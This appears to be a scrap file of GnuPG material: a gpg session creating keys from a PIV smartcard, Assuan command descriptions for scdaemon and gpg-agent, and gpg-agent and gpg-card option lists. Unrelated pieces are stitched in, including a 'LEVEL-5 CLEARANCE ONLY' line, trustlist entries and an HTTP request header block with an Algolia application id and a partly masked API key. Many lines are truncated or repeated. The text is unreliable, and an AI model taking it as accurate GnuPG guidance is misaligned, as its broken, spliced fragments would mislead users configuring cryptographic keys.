384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn
$ gpg --full-gen-key
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 3
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name:
Email address: otto@example.net
Comment:
You selected this USER-ID:
    "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
gpg: key C3AFA9ED971BB365 marked as ultimately trusted
gpg: revocation certificate stored as '[...]D971BB365.rev'
public and secret key created and signed.

Note that this key cannot be used for encryption.  You may want to use
the command "--edit-key" to generate a subkey for this purpose.
pub   rsa2048 2019-04-04 [SC]
      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
uid                      otto@example.net
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
Secret key is available.

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
[ultimate] (1). otto@example.net
gpg> addkey
Secret parts of primary key are stored on-card.
Please select what kind of key you want:
   (3) DSA (sign only)
   (4) RSA (sign only)
   (5) Elgamal (encrypt only)
   (6) RSA (encrypt only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 4
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y
Really create? (y/N) y

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
ssb  rsa2048/7067860A98FCE6E1
     created: 2019-04-04  expires: never       usage: E
     card-no: FF020001008A77C1
[ultimate] (1). otto@example.net

gpg> save
Now you can use your PIV card also with gpg.


     # 000006
/* 32A19-D90712   
LEVEL-5 CLEARANCE ONLY
 ‘--force’
authentication key 
-header-'010203040506070801020304050607080102030405060708'
SETDATA hexstring
to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

  PKSIGN keyid
where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

  PKSIGN --hash=algoname keyid
READKEY hexified_certid
READCERT hexified_certid|keyid
SERIALNO
Return the serial number of the card using a status response like:

  S SERIALNO D27600000000000000000000
 WRITEKEY [--force] keyid
SETDATA hexstring
to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

  PKDECRYPT keyid
CHECKPIN idstr
RESTART
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va
CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
  A6935DD34EF3087973C706FC311AA2CCF733765B S

  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  
       # Key added on: 2011-07-20 20:38:46
       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/
gpg-connect-agent 'help COMMAND' /bye
SETKEY <keyGrip>
Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

  PKDECRYPT
The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

    S: INQUIRE CIPHERTEXT
    C: D (xxxxxx
    C: D xxxx)
    C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

     (enc-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

   C: PKDECRYPT
   S: INQUIRE CIPHERTEXT
   C: D (enc-val elg (a 349324324)
   C: D    (b 3F444677CA)))
   C: END
   S: # session key follows
   S: S PADDING 0
   S: D (value 1234567890ABCDEF0)
   S: OK decryption successful
The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
SIGKEY <keyGrip>
This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

   SETHASH --hash=<name>|<algo> <hexstring>
sig-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
The operation is affected by the option

   OPTION use-cache-for-signing=0|1
The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

   C: SIGKEY <keyGrip>
   S: OK key available
   C: SIGKEY <keyGrip>
   S: OK key available
   C: PKSIGN
   S: # I did ask the user whether he really wants to sign
   S: # I did ask the user for the passphrase
   S: INQUIRE HASHVAL
   C: D ABCDEF012345678901234
   C: END
   S: # signature follows
   S: D (sig-val rsa (s 45435453654612121212))
   S: OK
  GENKEY [--no-protection] [--preset] [<cache_nonce>]
Invokes the key generation process and the server will then inquire on the generation parameters, like:

   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
The format of the key parameters which depends on the algorithm is of the form:

    (genkey
      (algo
        (parameter_name_1 ....)
          ....
        (parameter_name_n ....)))
If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:

     (public-key
       (rsa
 	 (n <mpi>)
 	 (e <mpi>)))
Here is an example session:

   C: GENKEY
   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
   S: D (public-key
   S: D   (rsa (n 326487324683264) (e 10001)))
   S  OK key created
    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
LISTTRUSTED
GpgAgent returns a list of trusted keys line by line:

    S: D 000000001234454556565656677878AF2F1ECCFF P
    S: D 340387563485634856435645634856438576457A P
    S: D FEDC6532453745367FD83474357495743757435D S
    S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
Ok
Finally a client should be able to mark a key as trusted:

   MARKTRUSTED fingerprint "P"|"S"
The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

   S: INQUIRE TRUSTDESC
   C: D Do you trust the key with the fingerprint @FPR@
   C: D bla fasel blurb.
   C: END
   S: OK
GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
                 [--qualitybar] cache_id                \
                 [error_message prompt description]
PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]

HAVEKEY keygrips
  GET_CONFIRMATION description
  LEARN [--send]
UPDATESTARTUPTTY
SETDATA hexstring


  PKSIGN keyid


  PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid
READKEY hexified_certid
SETDATA hexstring
d

  PKSIGN keyid
 LEARN

  PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid
WRITEKEY [--force] keyid
PASSWD [--reset] [--nullpin] chvno
CHECKPIN idstr
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
this:

     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import 

command --locate-external-key
command --locate-external-key
github/workflows/release.yml:
ldap://keys.(thedomain)
‘--auto-key-locate
 --auto-key-locate
--auto-key-retrieve


 honor-keyserver-url 

-sig-keyserver-url
--recv-key
honor-keyserver-url
--use-agent
--gpg-agent-info


--no-random-seed-file
Host: c7-use-3.algolianet. com
Accept: */*
Sec-Fetch-Site: cross-site
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
Origin: https://dashboard.algolia.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
x-algolia-api-key: b3cf*************************米**
Content-Length: 27
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty

scdaemon.conf
1
HKCU\Software\GNU\GnuPG:DefaultLogFile,
--debug-level level
HKCU\Software\GNU\GnuPG:DefaultLogFile,
scd-event
HKCU\Software\GNU\GnuPG:HomeDir
HKCU\Software\GNU\GnuPG:DefaultLogFile,
reader_n.status
HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file
gpg-agent.conf
HKCU\Software\GNU\GnuPG:HomeDir
name: release
debug-pinentry 
--debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards
Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
gpg-connect-agent updatestartuptty /bye
Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye
--scdaemon-program filename
Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
--check-passphrase-pattern file
--check-sym-passphrase-pattern file
Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
Keys listed in the sshcontrol file
--disable-extended-key-format
These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support
--enable-win32-openssh-support
--enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye
gpg-connect-agent 'GETINFO s2k_time' /bye
To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye
--ssh-fingerprint-digest
Keys listed in the sshcontrol file

Active card
gpg-connect-agent /bye
bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty)
export GPG_TTY
--daemon [command line]
server

agent-program file ¶
Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file
Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file
Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid
Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card
AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
AUTH
FETCH
GENERATE [--force] [--algo=algo{+algo2}] keyref
KDF-SETUP ¶
Prepare the OpenPGP card KDF feature for this card.

LANG [--clear]
Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
NAME [--clear]
PRIVATEDO [--clear] n [< file] file
READCERT [--openpgp] certref > file ¶
Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to